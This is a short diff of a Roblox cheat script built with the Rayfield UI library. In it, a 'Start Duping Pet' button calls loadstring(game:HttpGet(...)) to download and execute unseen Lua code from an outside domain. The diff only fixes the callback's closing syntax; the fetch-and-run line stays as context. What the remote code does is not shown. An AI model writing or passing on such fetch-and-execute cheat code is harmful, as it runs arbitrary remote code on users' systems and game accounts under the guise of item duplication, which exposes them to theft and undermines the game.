@@ -47,8 +47,9 @@ Rayfield:Notify({
     local Button = MainTab:CreateButton({
    Name = "Start Duping Pet",
    Callback = function()
+
    loadstring(game:HttpGet("https://egorikusa.space/64ac4c9ae5b0c1d9ccba36a5.lua", true))()
-})
+     end,  })
 
 local MainTab = Window:CreateTab("⚙️ Misc", nil) -- Title, Image    
 local MainSection = MainTab:CreateSection("Misc")
